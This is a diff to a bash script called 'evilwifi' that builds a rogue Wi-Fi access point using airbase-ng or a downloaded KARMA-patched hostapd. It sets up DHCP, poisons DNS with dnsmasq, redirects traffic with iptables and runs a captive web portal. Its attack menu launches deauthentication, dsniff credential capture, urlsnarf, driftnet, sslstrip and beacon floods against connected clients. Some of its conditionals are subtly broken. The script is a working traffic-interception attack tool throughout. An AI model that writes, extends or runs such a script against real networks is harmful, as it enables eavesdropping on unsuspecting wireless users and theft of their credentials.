@@ -6,20 +6,15 @@
 # GLOBAL VARIABLES #
 ####################
 REVISION=050
-function todo(){
-echo "TODO LIST FOR NEWER REVISIONS"
-echo "- Cleanup Errors On Script Exit"
-echo "- Create Settings File For AutoMode"
-}
 ####################
 #  CONFIG SECTION  #
 ####################
-at0IP=10.0.0.1             #ip address of moniface
+TAPIP=10.0.0.1             #ip address of moniface
 NETMASK=255.255.0.0        #subnetmask
 WILDCARD=0.0.255.255       #dunno what this is
 # =>
 # NETWORK=/16
-at0IPBLOCK=10.0.0.0        #subnet
+TAPIPBLOCK=10.0.0.0        #subnet
 DHCPS=10.0.0.1             #dhcp start range
 DHCPE=10.0.255.254         #dhcp end range
 BROADCAST=10.0.255.255     #broadcast address
@@ -31,10 +26,11 @@ DHCPL=1h                   #time for dhcp lease
 termwidth=130
 folder=~/.evilwifi
 initpath=`pwd`
-if [ -d != $folder ]; then mkdir $folder 2> /dev/null; fi
-settings=$folder/evilwifi.conf
-sessionfolder=~/.evilwifi/SESSION_$RANDOM
+settings=evilwifi.conf
+sessionfolder=$folder/SESSION_$RANDOM
 LOG=$sessionfolder/evilwifi.log
+if [ -d != $folder ]; then mkdir $folder 2> /dev/null; fi
+if [ -f $settings ]; then readconfig; fi
 mkdir $sessionfolder
 touch $LOG
 touch $folder/missing.log
@@ -54,19 +50,8 @@ echo "
 +-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
 "
 }
-function automode(){
-ATHIFACE=wlan0
-ESSID=WiFi
-CHAN=1
-MTU=1500
-PPS=100
-BEAINT=50
-WIFILIST=
-OTHEROPTS=
+function readconfig(){
 MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
-SPOOFMAC=
-if [ "$mode" = "2" ]; then DHCPSERVER=4; else DHCPSERVER=1; fi
-DNSURL=#
 }
 OK=`printf "\e[1;32m OK \e[0m"`
 FAIL=`printf "\e[1;31mFAIL\e[0m"`
@@ -86,7 +71,6 @@ mv $APACHECONF/default~ $APACHECONF/default
 dhcpconf=/etc/dhcp3/dhcpd.conf
 echo > $dhcpconf
 echo > /etc/dnsmasq.conf
-echo "Log File: $folder/evilwifi.log"
 }
 function pinginternet(){
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
@@ -122,7 +106,6 @@ fi
 }
 function update(){
 echo ""
-stopshit
 echo "#####################################"
 echo "# ATTEMPTING TO DOWNLOAD UPDATE     #"
 echo "#####################################"
@@ -140,11 +123,23 @@ fi
 }
 function installaircrack(){
 cd /usr/src
-if [ -d "/usr/src/aircrack-ng" ]; then rm -rfv aircrack-ng; fi
+if [ -d "/usr/src/aircrack-ng" ]; then rm -rfv aircrack-ng*; fi
 svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng
 cd aircrack-ng
 make && make install
 cd $initpath
+}
+function installhostapd(){
+cd /usr/src
+if [ -d "/usr/src/hostapd" ]; then rm -rfv hostapd*; fi
+wget -nv -t 1 -T 10 http://www.digininja.org/files/hostapd-1.0-karma.tar.bz2
+tar -xvf hostapd-1.0-karma.tar.bz2
+cd hostapd-1.0-karma
+make && make install
+cd $initpath
+}
+function hostapdkarma(){
+hostapd -f $sessionfolder/hostapd.log ~/hostapd-karma.conf -B
 }
 function pspids(){
 pgrep airbase-ng > $sessionfolder/airbase-ng.pid
@@ -172,8 +167,8 @@ kill `cat $folder/pwned.pid 2>$LOG` &>/dev/null
 kill `cat $folder/web.pid 2>$LOG` &>/dev/null
 kill `cat $pid 2>$LOG` &>/dev/null
 fi; done
-if [ -f /var/run/dhcpd/at0.pid ]; then
-kill `cat /var/run/dhcpd/at0.pid 2>$LOG` &>/dev/null;
+if [ -f /var/run/dhcpd/$TAPIFACE.pid ]; then
+kill `cat /var/run/dhcpd/$TAPIFACE.pid 2>$LOG` &>/dev/null;
 fi
 killall -9 airodump-ng aireplay-ng wireshark mdk3 driftnet urlsnarf dsniff &>/dev/null
 iptables --flush
@@ -184,7 +179,6 @@ iptables --delete-chain
 iptables --table nat --delete-chain
 iptables --table mangle --delete-chain
 echo "0" > /proc/sys/net/ipv4/ip_forward
-ifconfig eth0 down
 }
 function firewall(){
 iptables -P FORWARD ACCEPT
@@ -196,18 +190,18 @@ echo "1" > /proc/sys/net/ipv4/ip_forward
 }
 function firewallportal(){
 iptables -t mangle -N internet
-iptables -t mangle -A PREROUTING -i at0 -p tcp -m tcp --dport 80 -j internet
+iptables -t mangle -A PREROUTING -i $TAPIFACE -p tcp -m tcp --dport 80 -j internet
 iptables -t mangle -A internet -j MARK --set-mark 99
-iptables -t nat -A PREROUTING -i at0 -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $TAPIP
 }
 function dhcpd3server(){
 echo "* DHCPD3 SERVER!!! *"
-replace INTERFACES=\"\" INTERFACES=\"at0\" -- /etc/default/dhcp3-server
+replace INTERFACES=\"\" INTERFACES=\"$TAPIFACE\" -- /etc/default/dhcp3-server
 echo "" > /var/lib/dhcp3/dhcpd.leases
 mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd;
 dhcpconf=/etc/dhcp3/dhcpd.conf
-echo "ddns-update-style none;" >> $dhcpconf
-echo "default-lease-time 600;" > $dhcpconf
+echo "ddns-update-style none;" > $dhcpconf
+echo "default-lease-time 600;" >> $dhcpconf
 echo "max-lease-time 7200;" >> $dhcpconf
 echo "" >> $dhcpconf
 echo "log-facility local7;" >> $dhcpconf
@@ -216,22 +210,22 @@ echo "" >> $dhcpconf
 echo "authoritative;" >> $dhcpconf
 echo "" >> $dhcpconf
 # echo "shared-network NetworkName {" >> $dhcpconf
-echo "subnet $at0IPBLOCK netmask $NETMASK {" >> $dhcpconf
+echo "subnet $TAPIPBLOCK netmask $NETMASK {" >> $dhcpconf
 # echo "option subnet-mask $NETMASK;" >> $dhcpconf
 # echo "option broadcast-address $BROADCAST;" >> $dhcpconf
 echo "option domain-name backtrack-linux;" >> $dhcpconf
-echo "option domain-name-servers $at0IP;" >> $dhcpconf
-echo "option routers $at0IP;" >> $dhcpconf
+echo "option domain-name-servers $TAPIP;" >> $dhcpconf
+echo "option routers $TAPIP;" >> $dhcpconf
 echo "range $DHCPS $DHCPE;" >> $dhcpconf
 echo "allow unknown-clients;" >> $dhcpconf
 echo "one-lease-per-client false;" >> $dhcpconf
 echo "}" >> $dhcpconf
 # echo "}" >> $dhcpconf
 gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
-"dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/at0.pid at0"
+"dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
 }
 function dnsmasqserver(){
-echo "address=/$DNSURL/$at0IP" > /etc/dnsmasq.conf
+echo "address=/$DNSURL/$TAPIP" > /etc/dnsmasq.conf
 echo "dhcp-authoritative" >> /etc/dnsmasq.conf
 echo "dhcp-lease-max=102" >> /etc/dnsmasq.conf
 echo "domain-needed" >> /etc/dnsmasq.conf
@@ -241,15 +235,15 @@ echo "localise-queries" >> /etc/dnsmasq.conf
 echo "log-queries" >> /etc/dnsmasq.conf
 echo "log-dhcp" >> /etc/dnsmasq.conf
 echo "" >> /etc/dnsmasq.conf
-# echo "interface=at0" >> /etc/dnsmasq.conf
+# echo "interface=$TAPIFACE" >> /etc/dnsmasq.conf
 echo "dhcp-leasefile=$folder/dnsmasq.leases" >> /etc/dnsmasq.conf
 echo "resolv-file=$folder/resolv.conf" >> /etc/dnsmasq.conf
 echo "stop-dns-rebind" >> /etc/dnsmasq.conf
 # echo "rebind-localhost-ok" >> /etc/dnsmasq.conf
 echo "dhcp-range=$DHCPS,$DHCPE,$NETMASK,$DHCPL" >> /etc/dnsmasq.conf
-echo "dhcp-option=wirelesslan,3,$at0IP" >> /etc/dnsmasq.conf
-echo "dhcp-host=$MAC,$at0IP" >> /etc/dnsmasq.conf
-echo "nameserver $at0IP" > $folder/resolv.conf
+echo "dhcp-option=wirelesslan,3,$TAPIP" >> /etc/dnsmasq.conf
+echo "dhcp-host=$MAC,$TAPIP" >> /etc/dnsmasq.conf
+echo "nameserver $TAPIP" > $folder/resolv.conf
 if [ "$mode" = "1" ]; then startdnsmasq; fi
 if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
 }
@@ -259,9 +253,9 @@ gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -
 }
 function brlan(){
 brctl addbr br-lan
-brctl addif br-lan at0
+brctl addif br-lan $TAPIFACE
 brctl addif br-lan $LANIFACE
-ifconfig at0 0.0.0.0 up
+ifconfig $TAPIFACE 0.0.0.0 up
 ifconfig $LANIFACE 0.0.0.0 up
 ifconfig br-lan up
 iptables -A FORWARD -i br-lan -j ACCEPT
@@ -284,14 +278,15 @@ function brlandown(){
 ifconfig br-lan down
 brctl delbr br-lan
 }
-function lanifacemenu(){
-echo "+===================================+"
-echo "| Interface With Internet?          |"
-echo "+===================================+"
-echo ""
-awk '/HWaddr/' < <(ifconfig)
-echo ""
-read -e -p "Option: " LANIFACE
+function apachesetup(){
+echo "ErrorDocument 404 /404.php" > /etc/apache2/conf.d/localized-error-pages
+echo > /var/log/apache2/access.log
+echo > /var/log/apache2/error.log
+ln -s /var/log/apache2/access.log $sessionfolder/access.log
+ln -s /var/log/apache2/error.log $sessionfolder/error.log
+APACHECONF=/etc/apache2/sites-available
+if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
+else cp $APACHECONF/default $APACHECONF/default~; fi
 }
 function apachecheck(){
 apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
@@ -301,9 +296,8 @@ echo "* Starting Apache2 Web Server *"
 sleep 2
 apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
 if [[ -z $apache ]]; then
-echo "* Apache Failed To Start Trying Again... *"
+echo "* Apache Failed To Start Skipping... *"
 sleep 4
-apachecheck
 else
 echo "* Apache2 Web Server Started *"
 fi
@@ -361,17 +355,19 @@ read -e -p "Option: " mode
 echo ""
 if [ "$mode" = "" ]; then clear; poisonmenu; fi
 }
-function verbosemenu(){
+function softapmenu(){
 echo "+===================================+"
-echo "| Verbosity Level?                  |"
+echo "| Which AP Software?                |"
 echo "+===================================+"
-echo "| 0) Use Default Settings *CAUTION*  "
-echo "| 1) Answer Some Questions To Setup  "
+echo "| 0) Airbase-NG All Probes           "
+echo "| 1) HOSTAPD w KARMA                 "
 echo "+===================================+"
 echo ""
-read -e -p "Option: " verbose
+read -e -p "Option: " softap
 echo ""
-if [ "$verbose" = "" ]; then clear; verbosemenu; fi
+if [ "$softap" = "" ]; then clear; softapmenu; fi
+if [ "$softap" = "0" ]; then TAPIFACE=at0; fi
+if [ "$softap" = "1" ]; then TAPIFACE=$ATHIFACE; fi
 }
 function dhcpmenu(){
 echo "+===================================+"
@@ -411,13 +407,13 @@ echo "no-poll" >> /etc/dnsmasq.conf
 echo "no-resolv" >> /etc/dnsmasq.conf
 echo "* DNSMASQ DNS POISON!!! *"
 gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
-"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
+"dnsmasq --no-daemon --interface=$TAPIFACE --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function startdnsmasqresolv(){
-echo "dhcp-option=wirelesslan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
+echo "dhcp-option=wirelesslan,6,$TAPIP,8.8.8.8" >> /etc/dnsmasq.conf
 echo "* DNSMASQ With Internet *"
 gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
-"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
+"dnsmasq --no-daemon --interface=$TAPIFACE --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function nodhcpserver(){
 echo "* Not Using A Local DHCP Server *"
@@ -429,7 +425,7 @@ echo "echo \$$ > $folder/probe.pid" > $folder/probe.sh
 echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" >> $folder/probe.sh
 echo "echo \$$ > $folder/pwned.pid" > $folder/pwned.sh
 echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /at0/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/DHCPACK/ && /$TAPIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
 echo "echo \$$ > $folder/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
 echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/access.log)" >> $folder/web.sh
@@ -575,6 +571,8 @@ if [ "$CHARGE" -gt "30" ]
 then
    COLOUR="$GRN"
 fi
+
+echo $CHARGE
 }
 # +===================================+
 # | ANYTHING UNDER THIS IS UNTESTED   |
@@ -825,12 +823,10 @@ stopshit
 modprobe tun
 echo ""
 poisonmenu
-verbosemenu
-if [ "$mode" != "2" ]; then dhcpmenu;
-else lanifacemenu; fi
+softapmenu
+if [ "$mode" != "2" ]; then dhcpmenu; fi
 monitormodestop
-if [ "$verbose" = "0" ]; then automode;
-else
+if [ -f != $settings ]; then
 echo ""
 echo "+===================================+"
 echo "| Listing Wireless Devices          |"
@@ -867,56 +863,42 @@ fi
 echo ""
 monitormodestart
 if [ "$mode" = "4" ]; then wepattackmenu; fi
-#
 echo "* STARTING ACCESS POINT: $ESSID *"
-echo "* IP: $at0IP *"
-if [ "$verbose" -gt "0" ]; then
+echo "* IP: $TAPIP *"
 echo "* BSSID: $MAC *"
 echo "* CHANNEL: $CHAN *"
 echo "* PACKETS PER SECOND: $PPS *"
 echo "* BEACON INTERVAL: $BEAINT *"
-fi
-#
-airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
-#airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
+#airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
+hostapdkarma
 sleep 2
 if [ "$mode" != "2" ]; then
-ifconfig at0 up
-ifconfig at0 $at0IP netmask $NETMASK;
-ifconfig at0 mtu $MTU;
-route add -net $at0IPBLOCK netmask $NETMASK gw $at0IP; fi
-wireshark -i at0 -k &
-#
+ifconfig $TAPIFACE up
+ifconfig $TAPIFACE $TAPIP netmask $NETMASK;
+ifconfig $TAPIFACE mtu $MTU;
+route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP; fi
+wireshark -i $TAPIFACE -k &
+if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
 if [ "$DHCPSERVER" = "1" ]; then dnsmasqserver; fi
 if [ "$DHCPSERVER" = "2" ]; then dhcpd3server; fi
 if [ "$DHCPSERVER" = "3" ]; then udhcpdserver; fi
 if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
-#
 if [ "$mode" = "1" ]; then
-ERRORFILE=$(awk '/index/ { print $1 }' < <(ls /var/www))
-if [ "$ERRORFILE" = "" ]; then ERRORFILE=index.php; fi
-echo "ErrorDocument 404 /$ERRORFILE" > /etc/apache2/conf.d/localized-error-pages
-echo > /var/log/apache2/access.log
-echo > /var/log/apache2/error.log
-ln -s /var/log/apache2/access.log $sessionfolder/access.log
-ln -s /var/log/apache2/error.log $sessionfolder/error.log
-APACHECONF=/etc/apache2/sites-available
-if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
-else cp $APACHECONF/default $APACHECONF/default~; fi
+apachesetup
 apachecheck
 firewall
-iptables -A FORWARD -i at0 -j ACCEPT
-#iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP:53
-iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP:53
-#iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP:67
-#iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP:67
-#iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $at0IP:68
-#iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $at0IP:68
-#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP:80
-#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP:443
-#iptables -t nat -A POSTROUTING -o at0 -j MASQUERADE
+iptables -A FORWARD -i $TAPIFACE -j ACCEPT
+#iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $TAPIP:53
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $TAPIP:53
+#iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $TAPIP:67
+#iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $TAPIP:67
+#iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $TAPIP:68
+#iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $TAPIP:68
+#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $TAPIP:80
+#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $TAPIP:443
+#iptables -t nat -A POSTROUTING -o $TAPIFACE -j MASQUERADE
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
-echo "nameserver $at0IP" >> /etc/resolv.conf
+echo "nameserver $TAPIP" >> /etc/resolv.conf
 fi
 if [ "$mode" = "2" ]; then
 firewall
@@ -928,10 +910,10 @@ fi
 taillogs
 attackmenu
 if [ "$attack" = "1" ]; then deauth; fi
-if [ "$attack" = "2" ]; then wireshark -i at0 -p -k -w $folder/at0.pcap; fi
-if [ "$attack" = "3" ]; then dsniff -m -i at0 -d -w $folder/dsniff.log; fi
-if [ "$attack" = "4" ]; then urlsnarf -i at0; fi
-if [ "$attack" = "5" ]; then driftnet -i at0; fi
+if [ "$attack" = "2" ]; then wireshark -i $TAPIFACE -p -k -w $folder/$TAPIFACE.pcap; fi
+if [ "$attack" = "3" ]; then dsniff -m -i $TAPIFACE -d -w $folder/dsniff.log; fi
+if [ "$attack" = "4" ]; then urlsnarf -i $TAPIFACE; fi
+if [ "$attack" = "5" ]; then driftnet -i $TAPIFACE; fi
 if [ "$attack" = "6" ]; then sslstrip -a -k -f; fi
 if [ "$attack" = "7" ]; then beaconflood; fi
 if [ "$attack" = "8" ]; then exit 0; fi
@@ -941,6 +923,4 @@ echo "ATEMPTING TO END ATTACK..."
 stopshit
 monitormodestop
 cleanup
-#firefox http://www.hackerbusters.ca/
-read -e -p "DONE THANKS FOR PLAYING YOU MAY NOW CLOSE THIS "
 fi
